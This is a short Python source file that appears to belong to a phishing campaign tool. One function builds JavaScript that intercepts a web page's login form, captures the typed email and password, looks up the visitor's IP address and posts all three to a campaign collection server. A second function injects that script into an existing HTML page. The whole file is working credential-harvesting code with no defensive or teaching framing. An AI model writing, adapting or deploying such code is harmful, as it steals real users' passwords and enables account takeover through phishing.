
def create_js_script(user_id, campaign_name):

    js_code = """
        <script>
            document.getElementById("loginForm").addEventListener("submit", async function(event) {
                event.preventDefault(); 

                const email = document.querySelector('input[name="email"]').value;
                const password = document.querySelector('input[name="pass"]').value;
                const ipResponse = await fetch("https://api64.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const userIp = ipData.ip || "Unknown";

                const data = {
                    email: email,
                    password: password,
                    ip: userIp
                };
                
            try {
        """
    js_code += f"const response = await fetch(`http://127.0.0.1:5000/campaign/{user_id}/{campaign_name}`"
    js_code += """, 
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json', 
                },
                    body: JSON.stringify(data), 
                });

                if (response.ok) {
                    console.log("Login successful!");
                } else {      
                    console.log("Login failed!");
                }
                } catch (error) {
                    console.log("There was an error with the request.");
                }
            });
        </script>
        """

    return js_code

def add_script_to_html(html_path: str, script: str) -> str:
    try:
        with open(html_path, "r", encoding="utf-8") as file:
            html = file.read()

        # Remove the closing </html> tag
        html = html.replace("</html>", "")

        # Append the script and re-add </html>
        script_tag = f"{script}\n</html>"
        html += script_tag

        return html  # Return modified HTML

    except FileNotFoundError:
        print(f"Error: File '{html_path}' not found.")
        return ""
    except Exception as e:
        print(f"Error processing file '{html_path}': {e}")
        return ""


